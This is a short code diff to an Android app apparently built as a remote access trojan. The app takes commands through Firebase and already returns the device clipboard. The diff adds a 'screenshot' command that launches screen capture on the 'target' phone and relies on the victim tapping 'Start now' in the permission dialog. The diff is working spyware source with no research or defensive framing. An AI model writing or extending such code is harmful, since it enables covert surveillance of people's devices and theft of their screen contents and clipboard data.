@@ -2,6 +2,7 @@ package com.ratio.ratapp;
 
 import android.content.Context;
 
+import android.content.Intent;
 import com.google.firebase.database.DataSnapshot;
 
 import java.io.File;
@@ -102,6 +103,15 @@ public class CommandRouter {
             case "clipboard":
                 result.put("data", SystemState.clipboard(ctx));
                 break;
+
+            case "screenshot": {
+                // Spawns screen cap that lands once target taps 'Start now'
+                Intent i = new Intent(ctx, ScreenCapActivity.class);
+                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                ctx.startActivity(i);
+                result.put("data", "projection dialog deployed to target screen — tap 'Start now' to capture");
+                break;
+            }
 
             default:
                 result.put("error", "unknown action: " + action);
